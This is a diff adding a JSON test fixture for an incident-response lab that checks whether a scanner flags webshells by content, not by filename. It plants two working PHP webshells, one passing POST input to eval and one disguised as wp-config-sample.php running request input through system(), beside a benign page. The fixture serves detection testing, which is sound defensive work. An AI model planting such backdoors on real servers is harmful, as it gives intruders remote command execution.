@@ -1,0 +1,24 @@
+{
+  "name": "initial_access_webshell",
+  "incident_id": "IR-LAB-WEBSHELL",
+  "description": "Initial access through a web application: a shell dropped into the document root, and a second copy under a name that reads as legitimate. The claim under test is detection by CONTENT rather than by filename — an intruder does not call the file shell.php.",
+
+  "plant": [
+    {"id": "webshell",  "type": "file", "path": "/var/www/html/shell.php", "mode": "644",
+     "content": "<?php @eval($_POST['cmd']); ?>\n"},
+
+    {"id": "disguised", "type": "file", "path": "/var/www/html/wp-config-sample.php", "mode": "644",
+     "content": "<?php\n// looks like a config file\nif(isset($_REQUEST['x'])){ system($_REQUEST['x']); }\n?>\n"},
+
+    {"id": "benign",    "type": "file", "path": "/var/www/html/index.php", "mode": "644",
+     "content": "<?php echo 'ir-lab benign page'; ?>\n"}
+  ],
+
+  "expect": [
+    {"id": "an obvious webshell is FLAGGED",
+     "finding_contains": "shell.php", "needs_plant": "webshell"},
+
+    {"id": "a webshell under an innocuous filename is FLAGGED (content, not name)",
+     "finding_contains": "wp-config-sample.php", "needs_plant": "disguised"}
+  ]
+}
